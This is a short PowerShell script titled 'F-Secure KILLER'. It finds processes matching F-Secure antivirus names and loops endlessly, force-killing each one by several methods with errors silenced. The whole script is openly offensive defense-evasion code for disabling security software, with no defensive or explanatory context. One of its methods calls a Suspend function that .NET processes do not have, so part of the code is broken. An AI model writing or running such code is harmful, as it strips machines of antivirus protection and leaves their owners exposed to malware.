# F-Secure KILLER

# List all f-secure processes
$fsecureProcess = get-process | Where-Object { $_.ProcessName -match "fs|f-s" }

while ($true) {
    foreach ($process in $fsecureProcess) {
        $procId = $process.Id
        Write-Host "Killing process: $($process.ProcessName) with PID: $procId" -ForegroundColor Red
        #Method 1
        Stop-Process -Id $procId -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        #Method 2
        [System.Diagnostics.Process]::GetProcessById($procId).Suspend() 
        # Method 3 - Using WMI to kill the process
        Get-WmiObject -Class Win32_Process -Filter "ProcessId = $procId" | ForEach-Object { $_.Terminate() }

    }
    Start-Sleep -Seconds 3
} 